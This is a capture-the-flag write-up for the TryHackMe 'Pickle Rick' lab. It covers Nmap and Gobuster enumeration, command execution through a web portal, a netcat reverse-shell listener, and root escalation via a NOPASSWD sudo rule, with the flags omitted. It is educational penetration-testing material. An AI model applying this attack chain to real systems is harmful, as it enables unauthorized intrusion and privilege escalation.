# TryHackMe — Pickle Rick

> A Rick and Morty-themed CTF focused on web enumeration, command execution, reverse shell access, and Linux privilege escalation.

## Room Information

| Item       | Details                            |
| ---------- | ---------------------------------- |
| Platform   | TryHackMe                          |
| Room       | Pickle Rick                        |
| Difficulty | Easy                               |
| Machine    | Pickle Rick v2                     |
| Target     | `10.112.154.82`                    |
| Category   | Web / Linux / Privilege Escalation |

---

## Objective

The objective of this room is to help Rick turn back into a human by finding the **three ingredients** required for his potion.

> The final answers are intentionally omitted from this write-up.

---

# 1. Reconnaissance

I started by scanning the target machine with Nmap.

```bash
nmap -sV -sC 10.112.154.82
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Two services were exposed:

* **22/tcp — SSH**
* **80/tcp — HTTP**

The web server was running Apache on Ubuntu.

The HTTP page title was:

```text
Rick is sup4r cool
```

Since HTTP was available, I focused on web enumeration.

---

# 2. Web Enumeration

I used Gobuster to discover hidden files and directories.

```bash
gobuster dir -u http://10.112.154.82 \
-w /usr/share/wordlists/dirb/common.txt
```

Interesting results:

```text
/assets        (Status: 301)
/index.html    (Status: 200)
/robots.txt    (Status: 200)
```

I then enumerated common PHP and TXT files:

```bash
gobuster dir -u http://10.112.154.82 \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt
```

Interesting results:

```text
denied.php     (Status: 302)
/login.php     (Status: 200)
/portal.php    (Status: 302)
/robots.txt    (Status: 200)
```

---

# 3. robots.txt

I checked the `robots.txt` file:

```bash
curl http://10.112.154.82/robots.txt
```

The file contained a clue that was useful for further enumeration.

> The exact clue is intentionally omitted.

---

# 4. Rick Portal

I discovered the portal at:

```text
http://10.112.154.82/portal.php
```

The page was titled:

```text
Rick Portal
```

The portal contained a command panel.

The application allowed commands to be executed on the server, which provided a path toward obtaining a shell.

---

# 5. Reverse Shell

I prepared a Netcat listener on my Kali machine:

```bash
nc -lnvp 4443
```

The reverse shell connected back to my Kali machine.

The resulting shell was:

```text
www-data@ip-10-112-154-82:/var/www/html$
```

I verified the current user:

```bash
whoami
```

Output:

```text
www-data
```

At this point, I had command-line access as the `www-data` user.

---

# 6. Enumerating the Web Directory

I listed the files in the web root:

```bash
ls
```

Output:

```text
Sup3rS3cretPickl3Ingred.txt
clue.txt
index.html
portal.php
assets
denied.php
login.php
robots.txt
```

The file `Sup3rS3cretPickl3Ingred.txt` looked particularly interesting.

I read it:

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

The file contained one of the challenge's required ingredients.

> The content of the file is intentionally omitted.

---

# 7. Privilege Escalation

Next, I checked the sudo permissions available to `www-data`:

```bash
sudo -l
```

The important result was:

```text
User www-data may run the following commands on ip-10-112-154-82:
    (ALL) NOPASSWD: ALL
```

This meant that `www-data` could execute commands as any user, including root, without entering a password.

I used:

```bash
sudo su
```

Then verified my privileges:

```bash
whoami
```

Output:

```text
root
```

I had successfully escalated to root.

---

# 8. Finding the Second Ingredient

I checked the users' home directories:

```bash
cd /home
ls
```

Output:

```text
rick
ubuntu
```

I entered Rick's home directory:

```bash
cd /home/rick
ls
```

There was a file containing another required ingredient.

I read the file:

```bash
cat 'second ingredients'
```

> The content of the file is intentionally omitted.

---

# 9. Finding the Final Ingredient

Since I had root privileges, I checked the root user's home directory:

```bash
cd /root
ls
```

Output:

```text
3rd.txt
snap
```

I read the file:

```bash
cat 3rd.txt
```

The file contained the final ingredient required by the challenge.

> The content of the file is intentionally omitted.

---

# 10. Answers

The final answers are intentionally **not included** in this write-up.

This is done to avoid publicly revealing the solutions to the TryHackMe room.

---

# 11. Attack Chain

The complete attack path was:

```text
Nmap
  │
  ├── SSH : 22
  │
  └── HTTP : 80
          │
          ├── robots.txt
          │
          ├── Gobuster
          │
          ├── login.php
          │
          └── portal.php
                  │
                  ▼
            Command Execution
                  │
                  ▼
             Reverse Shell
                  │
                  ▼
              www-data
                  │
                  ▼
              sudo -l
                  │
                  ▼
          NOPASSWD: ALL
                  │
                  ▼
                 root
                  │
          ┌───────┴────────┐
          ▼                ▼
     /home/rick          /root
          │                │
          ▼                ▼
   Challenge File      Challenge File
```

---

# 12. Commands Used

### Nmap

```bash
nmap -sV -sC 10.112.154.82
```

### Gobuster

```bash
gobuster dir -u http://10.112.154.82 \
-w /usr/share/wordlists/dirb/common.txt
```

### Gobuster with extensions

```bash
gobuster dir -u http://10.112.154.82 \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt
```

### Check robots.txt

```bash
curl http://10.112.154.82/robots.txt
```

### Netcat listener

```bash
nc -lnvp 4443
```

### Identify current user

```bash
whoami
```

### Check sudo privileges

```bash
sudo -l
```

### Privilege escalation

```bash
sudo su
```

### Access challenge files

```bash
cat Sup3rS3cretPickl3Ingred.txt
cat 'second ingredients'
cat /root/3rd.txt
```

> File contents are intentionally not included.

---

# 13. What I Learned

This room helped me practice several important penetration-testing concepts:

* Service enumeration with **Nmap**
* Web directory and file enumeration with **Gobuster**
* Inspecting `robots.txt` for useful clues
* Identifying interesting web application functionality
* Obtaining a reverse shell
* Linux post-exploitation enumeration
* Checking sudo permissions with `sudo -l`
* Exploiting an insecure `NOPASSWD: ALL` sudo configuration
* Navigating Linux directories and reading files
* Privilege escalation from `www-data` to `root`

---

# 14. Conclusion

The machine was compromised through the exposed web application. After obtaining a shell as `www-data`, I enumerated the local system and discovered that the user had unrestricted sudo privileges.

This allowed me to escalate to root and access the files containing the required challenge information.

The final answers and flag values are intentionally omitted from this write-up.

**Room Status:** Completed — 100%

**Skills Practiced:**

```text
Reconnaissance
Web Enumeration
Command Execution
Reverse Shell
Linux Enumeration
Privilege Escalation
Post-Exploitation
```

> This write-up documents activity performed against the intentionally vulnerable TryHackMe lab machine.
